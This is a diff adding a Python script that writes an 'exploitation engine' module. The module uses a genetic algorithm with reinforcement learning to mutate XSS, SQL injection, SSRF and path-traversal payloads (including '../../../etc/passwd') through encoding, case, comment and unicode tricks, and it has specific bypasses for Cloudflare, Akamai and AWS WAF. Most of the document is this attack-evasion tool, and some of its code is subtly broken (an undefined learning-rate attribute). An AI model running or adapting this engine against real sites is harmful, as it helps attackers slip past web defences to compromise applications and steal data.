@@ -1,0 +1,280 @@
+import os
+
+code = '''"""
+Intelligent Mutation Orchestrator
+"""
+
+import random
+import base64
+from typing import Dict, List, Any, Optional
+from datetime import datetime
+from collections import defaultdict
+
+
+class IntelligentMutationOrchestrator:
+    def __init__(self, learning_engine=None):
+        self.learning_engine = learning_engine
+        self.ga_population_size = 30
+        self.ga_mutation_rate = 0.4
+        self.q_table = defaultdict(float)
+        self.rl_epsilon = 0.15
+        self.target_context = {}
+        self.waf_type = None
+        self.history = []
+        
+        self.mutation_strategies = {
+            'encoding': self._mutate_encoding,
+            'case_variation': self._mutate_case,
+            'whitespace': self._mutate_whitespace,
+            'comment_injection': self._mutate_comments,
+            'unicode_obfuscation': self._mutate_unicode,
+            'waf_specific': self._mutate_waf_specific
+        }
+    
+    def evolve_payload(self, base_payload: str, vuln_type: str, 
+                       target_context: Dict, success_history: List[Dict]) -> str:
+        population = self._initialize_population(base_payload, vuln_type)
+        fitness_scores = self._evaluate_fitness(population, success_history)
+        
+        for generation in range(5):
+            parents = self._selection(population, fitness_scores)
+            offspring = self._crossover(parents)
+            offspring = self._mutation(offspring, vuln_type, target_context)
+            new_fitness = self._evaluate_fitness(offspring, success_history)
+            population = self._elitism(population, offspring, fitness_scores, new_fitness)
+            fitness_scores = self._evaluate_fitness(population, success_history)
+        
+        best_idx = fitness_scores.index(max(fitness_scores))
+        return population[best_idx]
+    
+    def _initialize_population(self, base_payload: str, vuln_type: str) -> List[str]:
+        population = [base_payload]
+        strategies = list(self.mutation_strategies.keys())
+        
+        for _ in range(self.ga_population_size - 1):
+            payload = base_payload
+            for _ in range(random.randint(1, 3)):
+                strategy = random.choice(strategies)
+                try:
+                    payload = self.mutation_strategies[strategy](payload, vuln_type)
+                except:
+                    pass
+            population.append(payload)
+        
+        return population
+    
+    def _evaluate_fitness(self, population: List[str], 
+                         success_history: List[Dict]) -> List[float]:
+        fitness_scores = []
+        tried_payloads = [h.get('payload') for h in success_history]
+        
+        for payload in population:
+            fitness = 0.0
+            for history in success_history:
+                if history.get('payload') == payload and history.get('success'):
+                    fitness += 10.0
+            if payload not in tried_payloads:
+                fitness += 5.0
+            fitness += self._calculate_complexity(payload) * 2.0
+            fitness += self._estimate_waf_bypass_potential(payload) * 3.0
+            fitness_scores.append(fitness)
+        
+        return fitness_scores
+    
+    def _selection(self, population: List[str], 
+                   fitness_scores: List[float]) -> List[str]:
+        parents = []
+        for _ in range(len(population) // 2):
+            tournament_idx = random.sample(range(len(population)), 3)
+            tournament_fitness = [fitness_scores[i] for i in tournament_idx]
+            winner_idx = tournament_idx[tournament_fitness.index(max(tournament_fitness))]
+            parents.append(population[winner_idx])
+        return parents
+    
+    def _crossover(self, parents: List[str]) -> List[str]:
+        offspring = []
+        for i in range(0, len(parents) - 1, 2):
+            if random.random() < 0.7:
+                cp = random.randint(1, min(len(parents[i]), len(parents[i+1])) - 1)
+                if cp > 0:
+                    offspring.extend([
+                        parents[i][:cp] + parents[i+1][cp:],
+                        parents[i+1][:cp] + parents[i][cp:]
+                    ])
+                else:
+                    offspring.extend([parents[i], parents[i+1]])
+            else:
+                offspring.extend([parents[i], parents[i+1]])
+        return offspring
+    
+    def _mutation(self, offspring: List[str], vuln_type: str, 
+                  target_context: Dict) -> List[str]:
+        mutated = []
+        for payload in offspring:
+            if random.random() < 0.4:
+                strategy = self._select_mutation_strategy(vuln_type, target_context)
+                try:
+                    payload = self.mutation_strategies[strategy](payload, vuln_type)
+                except:
+                    pass
+            mutated.append(payload)
+        return mutated
+    
+    def _elitism(self, population: List[str], offspring: List[str],
+                 parent_fitness: List[float], offspring_fitness: List[float]) -> List[str]:
+        combined = list(zip(population + offspring, parent_fitness + offspring_fitness))
+        combined.sort(key=lambda x: x[1], reverse=True)
+        return [ind[0] for ind in combined[:self.ga_population_size]]
+    
+    def _select_mutation_strategy(self, vuln_type: str, target_context: Dict) -> str:
+        state = f"{vuln_type}:{self.waf_type}:{target_context.get('tech_stack', 'unknown')}"
+        actions = list(self.mutation_strategies.keys())
+        
+        if random.random() < self.rl_epsilon:
+            return random.choice(actions)
+        else:
+            q_values = [self.q_table.get(f"{state}:{action}", 0.0) for action in actions]
+            return actions[q_values.index(max(q_values))]
+    
+    def _mutate_encoding(self, payload: str, vuln_type: str) -> str:
+        mutations = [
+            lambda p: p.replace('<', '%3C').replace('>', '%3E'),
+            lambda p: p.replace(' ', '%20'),
+            lambda p: p.replace('"', '%22').replace("'", '%27'),
+            lambda p: ''.join(f'%{ord(c):02x}' if c.isalnum() else c for c in p)
+        ]
+        return random.choice(mutations)(payload)
+    
+    def _mutate_case(self, payload: str, vuln_type: str) -> str:
+        mutations = [
+            lambda p: p.swapcase(),
+            lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
+            lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p)
+        ]
+        return random.choice(mutations)(payload)
+    
+    def _mutate_whitespace(self, payload: str, vuln_type: str) -> str:
+        mutations = [
+            lambda p: p.replace(' ', '/**/'),
+            lambda p: p.replace(' ', '%09'),
+            lambda p: ''.join(c + ' ' if c.isalpha() and random.random() > 0.7 else c for c in p)
+        ]
+        return random.choice(mutations)(payload)
+    
+    def _mutate_comments(self, payload: str, vuln_type: str) -> str:
+        if vuln_type == 'sqli':
+            return payload.replace(' ', '/**/')
+        return payload.replace('>', '><!--')
+    
+    def _mutate_unicode(self, payload: str, vuln_type: str) -> str:
+        return payload.replace('<', u'\u003c').replace('>', u'\u003e')
+    
+    def _mutate_waf_specific(self, payload: str, vuln_type: str) -> str:
+        if not self.waf_type:
+            return payload
+        
+        waf_bypasses = {
+            'cloudflare': [lambda p: p.replace('<', '%253C')],
+            'akamai': [lambda p: p.replace('UNION', 'UN/**/ION')],
+            'aws_waf': [lambda p: p.replace('http://', 'hTtP://')]
+        }
+        
+        bypasses = waf_bypasses.get(self.waf_type, [])
+        return random.choice(bypasses)(payload) if bypasses else payload
+    
+    def _calculate_complexity(self, payload: str) -> float:
+        complexity = min(len(payload) / 100, 1.0) * 0.3
+        special_chars = sum(1 for c in payload if c in '<>%&\'"')
+        complexity += min(special_chars / 20, 1.0) * 0.3
+        return min(complexity, 1.0)
+    
+    def _estimate_waf_bypass_potential(self, payload: str) -> float:
+        score = 0.0
+        if '%' in payload: score += 0.3
+        if payload != payload.lower() and payload != payload.upper(): score += 0.2
+        if '/**/' in payload: score += 0.3
+        return min(score, 1.0)
+    
+    def update_from_feedback(self, payload: str, vuln_type: str, 
+                            success: bool, waf_detected: str = None):
+        state = f"{vuln_type}:{waf_detected}:{self.target_context.get('tech_stack', 'unknown')}"
+        action = self._identify_strategy_used(payload)
+        reward = 10.0 if success else -1.0
+        if waf_detected: reward -= 5.0
+        
+        q_key = f"{state}:{action}"
+        self.q_table[q_key] = ((1 - self.rl_learning_rate) * self.q_table.get(q_key, 0.0) + 
+                               self.rl_learning_rate * reward)
+        
+        if self.learning_engine:
+            try:
+                self.learning_engine.connect_detector_findings('mutation_optimizer', [{
+                    'payload': payload, 'vuln_type': vuln_type, 
+                    'success': success, 'reward': reward
+                }])
+            except:
+                pass
+    
+    def _identify_strategy_used(self, payload: str) -> str:
+        if '%' in payload: return 'encoding'
+        elif payload != payload.lower(): return 'case_variation'
+        elif '/**/' in payload: return 'comment_injection'
+        return 'unknown'
+    
+    def get_intelligent_payload(self, vuln_type: str, target_context: Dict,
+                                previous_attempts: List[Dict]) -> Dict[str, Any]:
+        base_payload = previous_attempts[-1].get('payload', '') if previous_attempts else self._generate_base_payload(vuln_type)
+        self.target_context = target_context
+        self.waf_type = target_context.get('waf_type')
+        
+        evolved = self.evolve_payload(base_payload, vuln_type, target_context, previous_attempts)
+        confidence = min(0.5 + self._calculate_complexity(evolved) * 0.2, 0.95)
+        
+        return {
+            'payload': evolved,
+            'confidence': confidence,
+            'strategy': 'genetic_algorithm_rl'
+        }
+    
+    def _generate_base_payload(self, vuln_type: str) -> str:
+        base_payloads = {
+            'xss': '<script>alert(1)</script>',
+            'sqli': "' UNION SELECT 1,2,3--",
+            'ssrf': 'http://127.0.0.1:80',
+            'lfi': '../../../etc/passwd'
+        }
+        return base_payloads.get(vuln_type, '')
+
+
+class MutationEngineIntegration:
+    def __init__(self, arc_orchestrator=None):
+        self.arc_orchestrator = arc_orchestrator
+        self.mutation_orchestrator = IntelligentMutationOrchestrator(
+            learning_engine=getattr(arc_orchestrator, 'learning_bridge', None) if arc_orchestrator else None
+        )
+    
+    def get_payload_with_intelligence(self, vuln_type: str, target_info: Dict) -> Dict:
+        previous_attempts = self._get_previous_attempts(vuln_type, target_info)
+        return self.mutation_orchestrator.get_intelligent_payload(vuln_type, target_info, previous_attempts)
+    
+    def _get_previous_attempts(self, vuln_type: str, target_info: Dict) -> List[Dict]:
+        if not self.arc_orchestrator or not hasattr(self.arc_orchestrator, 'learning_bridge'):
+            return []
+        try:
+            findings = self.arc_orchestrator.learning_bridge.get_detector_findings(vuln_type)
+            return findings[-20:] if findings else []
+        except:
+            return []
+    
+    def update_payload_feedback(self, payload: str, vuln_type: str, 
+                               success: bool, waf_detected: str = None):
+        self.mutation_orchestrator.update_from_feedback(payload, vuln_type, success, waf_detected)
+
+
+__all__ = ['IntelligentMutationOrchestrator', 'MutationEngineIntegration']
+'''
+
+with open('EXPLOITATION_ENGINE/intelligent_mutation_orchestrator.py', 'w', encoding='utf-8') as f:
+    f.write(code)
+
+print(f'Written {len(code)} chars')
